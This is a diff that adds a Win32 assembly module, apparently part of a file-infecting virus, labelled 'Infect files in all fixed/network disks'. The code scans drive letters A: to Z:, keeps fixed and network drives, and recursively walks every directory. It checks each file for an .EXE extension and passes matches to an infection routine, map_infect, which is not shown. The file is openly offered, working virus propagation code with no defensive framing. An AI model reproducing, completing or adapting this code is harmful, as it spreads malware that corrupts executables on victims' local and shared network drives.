@@ -1,0 +1,130 @@
+;%%%7 0 RSCN Infect files in all fixed/network disks
+
+;###FindFirstFileA
+;###FindNextFileA
+;###FindClose
+;###GetDriveTypeA
+;###SetCurrentDirectoryA
+infect_files:
+        pushad
+
+;scan all disks in system, starting by "A:\"
+
+	call delta
+        X_PUSH eax,\:@
+  @@next_disc:
+        cmp by [esp], "Z"
+        je @@done
+        inc dwo [esp]
+
+;wait! only scan fixed and network drives
+
+        push esp
+        call [ebp+_GetDriveTypeA]
+        cmp al, 4
+        je @@network
+        cmp al, 3
+        jne @@next_disc
+
+;scan it
+
+  @@network:
+        push esp
+        call [ebp+_SetCurrentDirectoryA]
+        test eax, eax
+        jz @@next_disc
+
+;search for files recursively
+
+        call search_disk
+        jmp @@next_disc
+  @@done:
+	X_POP
+        popad
+        ret
+
+
+;recursive file find
+
+search_disk:
+        pushad
+
+	sub esp,SIZEOF_WIN32_FIND_DATA
+	mov eax,esp
+	X_PUSH ecx,*.*~
+	mov ecx,esp
+
+;search for all files
+
+	push eax
+	push ecx
+	call [ebp+_FindFirstFileA]
+	X_POP
+	mov ebx,eax
+	inc eax
+	jz @@updir
+
+;found a directory, instead of a file? change current dir to it
+
+  @@scandir:
+        lea esi, [esp.WFD_szFileName]
+        test dwo [esp.WFD_dwFileAttributes],FILE_ATTRIBUTE_DIRECTORY
+        jnz @@isdir
+
+;if is a file, check if have .EXE extension
+
+  @@seekfilenameend:
+        lodsb
+        test al,al
+        jnz @@seekfilenameend
+
+	mov ecx,[esi-5]
+	or ecx,20202000h
+	sub ecx,("exe."-12345678h)
+	sub ecx,12345678h
+	jnz @@keepsearching
+
+;is a .EXE, then infect
+
+	call map_infect
+
+;search next file
+
+  @@keepsearching:
+        push esp
+        push ebx
+        call [ebp+_FindNextFileA]
+        test eax, eax
+        jnz @@scandir
+
+;error? no more files? return to previous directory and continue...
+
+  @@updir:
+        push ebx
+        call [ebp+_FindClose]
+
+	X_PUSH eax,..~
+        push esp
+        call [ebp+_SetCurrentDirectoryA]
+        X_POP
+
+	add esp,SIZEOF_WIN32_FIND_DATA
+
+        popad
+        ret
+
+;enter directory just found
+
+  @@isdir:
+        cmp by [esi], '.'
+        je @@keepsearching
+        push esi
+        call [ebp+_SetCurrentDirectoryA]
+        test eax, eax
+        jz @@keepsearching
+
+;and start scanning into it
+
+        call search_disk
+        jmp @@keepsearching
+
